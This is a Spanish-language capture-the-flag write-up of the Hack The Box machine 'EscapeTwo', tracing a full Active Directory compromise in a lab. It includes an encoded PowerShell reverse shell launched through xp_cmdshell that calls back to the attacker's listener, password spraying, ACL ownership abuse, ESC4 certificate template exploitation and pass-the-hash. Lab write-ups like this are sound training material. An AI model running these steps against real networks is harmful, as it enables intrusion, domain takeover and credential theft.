---
tags:
title: EscapeTwo - Easy (HTB)
permalink: /EscapeTwo-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49668,49693,49694,49697,49710,49723,49734 10.129.232.128
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-25 20:17 -0500
Nmap scan report for sequel.htb (10.129.232.128)
Host is up (0.57s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-26 01:18:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-12-26T01:20:28+00:00; +1m28s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-26T01:20:28+00:00; +1m29s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-12-26T01:20:28+00:00; +1m28s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-26T01:16:01
|_Not valid after:  2055-12-26T01:16:01
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-26T01:20:28+00:00; +1m28s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-12-26T01:20:27+00:00; +1m28s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-26T01:19:49
|_  start_date: N/A
|_clock-skew: mean: 1m28s, deviation: 0s, median: 1m27s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.00 seconds
```

## RPC / Port 135

### Enumerate domain users

Use las credenciales iniciales para poder conectarme al servicio de `rpc` para poder listar usuarios del dominio que ya sean validos.

```bash
rpcclient -U 'rose%KxEPkKe6R8su' 10.129.232.128
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[michael] rid:[0x44f]
user:[ryan] rid:[0x45a]
user:[oscar] rid:[0x45c]
user:[sql_svc] rid:[0x462]
user:[rose] rid:[0x641]
user:[ca_svc] rid:[0x647]
```

## SMB / Port 445

Por otro lado use las mismas para conectarme a `smb` en donde vi dos archivos de `excel`, por lo que los descargue a mi maquina con el comando `get`.

```bash
smbclient //10.129.232.128/'Accounting Department' -U sequel.htb/rose%KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 847180 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (3.0 KiloBytes/sec) (average 3.7 KiloBytes/sec)
smb: \> 
```
### Leaked password

Revisando uno de los archivos veo varias credenciales, donde la que me interesa es la del usuario `sa`.

```bash
cat excel_accounts/xl/sharedStrings.xml 2>/dev/null | xmllint --format -
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
  <si>
    <t xml:space="preserve">First Name</t>
  </si>
  <si>
    <t xml:space="preserve">Last Name</t>
  </si>
  <si>
    <t xml:space="preserve">Email</t>
  </si>
  <si>
    <t xml:space="preserve">Username</t>
  </si>
  <si>
    <t xml:space="preserve">Password</t>
  </si>
  <si>
    <t xml:space="preserve">Angela</t>
  </si>
  <si>
    <t xml:space="preserve">Martin</t>
  </si>
  <si>
    <t xml:space="preserve">angela@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">angela</t>
  </si>
  <si>
    <t xml:space="preserve">0fwz7Q4mSpurIt99</t>
  </si>
  <si>
    <t xml:space="preserve">Oscar</t>
  </si>
  <si>
    <t xml:space="preserve">Martinez</t>
  </si>
  <si>
    <t xml:space="preserve">oscar@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">oscar</t>
  </si>
  <si>
    <t xml:space="preserve">86LxLBMgEWaKUnBG</t>
  </si>
  <si>
    <t xml:space="preserve">Kevin</t>
  </si>
  <si>
    <t xml:space="preserve">Malone</t>
  </si>
  <si>
    <t xml:space="preserve">kevin@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">kevin</t>
  </si>
  <si>
    <t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
  </si>
  <si>
    <t xml:space="preserve">NULL</t>
  </si>
  <si>
    <t xml:space="preserve">sa@sequel.htb</t>
  </si>
  <si>
    <t xml:space="preserve">sa</t>
  </si>
  <si>
    <t xml:space="preserve">MSSQLP@ssw0rd!</t>
  </si>
</sst>
```

## Shell as svc_sql 
### MSSQL database

Usando las credenciales de `sa` ya que generalmente es el propietario de la base de datos de `mssql` me conecte, y como el mismo usuario no tiene restricciones habilite el componente `xp_cmdshell`.

```bash
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.129.232.128 -dc-ip 10.129.232.128              
<SNIP>
SQL (sa  dbo@master)> xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Exitosamente tengo ejecucion de comandos.

```bash
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   
NULL  
```
### Shell

Ahora me envié una shell en `base64` de `powershell`.

```bash
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

```

Y desde mi listener `nc` recibo la conexión como el usuario `svc_sql`.

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.128] 56183
whoami
sequel\sql_svc
PS C:\Windows\system32>
```
## Shell as ryan

Viendo uno de los archivos de configuración de `mssql` veo unas credenciales de las cuales no tenia a disposicion anteriormente.

```powershell
PS C:\SQL2019\ExpressAdv_ENU> cat SETUP.EXE.CONFIG
<SNIP>
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
<SNIP>
```
### Password spraying

Use la misma para realizar un `Password Spraying` con la lista de usuarios del dominio, lo cual me dio una coincidencia con el usuario `ryan`
```bash
kerbrute passwordspray --dc 10.129.232.128 -d sequel.htb users WqSZAF6CysDQbGb3

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/25/25 - Ronnie Flathers @ropnop

2025/12/25 21:32:14 >  Using KDC(s):
2025/12/25 21:32:14 >   10.129.232.128:88

2025/12/25 21:32:15 >  [+] VALID LOGIN:  sql_svc@sequel.htb:WqSZAF6CysDQbGb3
2025/12/25 21:32:16 >  [+] VALID LOGIN:  ryan@sequel.htb:WqSZAF6CysDQbGb3
2025/12/25 21:32:16 >  Done! Tested 12 logins (2 successes) in 2.073 seconds

```
## Auth

Use `evil-winrm` para conectarme a la maquina como dicho `usuario` y así poder ver la `flag`
```powershell
evil-winrm -i sequel.htb -u ryan -p WqSZAF6CysDQbGb3  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> type ../desktop/user.txt
085986c57833afb5cc7536208790baf5
```
### WriteOwner

Como el usuario `ryan` tiene el permiso `WriteOwner` sobre `ca_svc` tengo la capacidad de darle a ryan el permiso `Full Control`.

![image-center](/assets/images/Pasted image 20251225233257.png)
### Full Control Rights

Para hacerme propietario de este usuario use `owneredit` de impacket, y después `dacledit` para otorgarle permisos `Full Control`.

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_Svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
   
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/escape]
└─# impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_Svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'          
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251225-213500.bak
[*] DACL modified successfully!
```
## Shell as Administrator
### ADCS Enumeration

Anteriormente corrí el `winPEAS` dentro de la maquina donde el mismo, me chivo que la maquina es vulnerable a `ESC4` en caso de que pueda modificar el témplate, lo cual es valido ya que el usuario `ca_svc` es miembro del grupo `Cert Publishers`.

```powershell

ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
È Check for ADCS misconfigurations in the local DC registry
  StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.
  CertificateMappingMethods:  - Strong Certificate mapping enabled.
  IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.
  szOID_NTDS_CA_SECURITY_EXT not disabled for the CA - not vulnerable to ESC16.
È 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4                                                                                                          
  Dangerous rights over template: User  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: UserSignature  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: ClientAuth  (Rights: WriteProperty,ExtendedRight)
  Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)
  [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).


```
### Changing password

Para poder realizar el ataque voy necesitar una `password` para el usuario `ca_svc` por lo que use `BloodyAD` para setearle una.

```bash
bloodyAD  -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.232.128 set password ca_svc 'zsln123!$'
[+] Password changed successfully!
```
## ESC4

Ahora busque con las mismas credenciales, plantillas vulnerables.

```bash
certipy find -dc-ip 10.129.232.128 -target dc01.sequel.htb -enabled -vulnerable -stdout -u ca_svc -p 'zsln123!$' 
<SNIP>
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-26T05:39:27+00:00
    Template Last Modified              : 2025-12-26T05:39:27+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```
### Modifying template

Para poder abusar de esta plantilla primero necesito modificar la plantilla a un estado vulnerable con el siguiente comando.

```bash
certipy template \
    -u 'ca_svc@sequel.htb' -p 'zsln123!$' \  
    -dc-ip '10.129.232.128' -template 'DunderMifflinAuthentication' \
    -write-default-configuration -no-save
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

Después seguiría ya puedo solicitar el certificado.

```bash
root@kali$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb 

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Y finalmente me autentico con el mismo para recibir el `TGT` del usuario `Administrator`.

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.232.128'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-548670397-972687484-3496335370-500'
[*]     Security Extension SID: 'S-1-5-21-548670397-972687484-3496335370-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
## Shell

```POWERSHELL
evil-winrm -i sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff  
                                        
Evil-WinRM shell v3.9
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
52445026b41001cc99d5da48fc20ba0f
```

`~Happy Hacking.`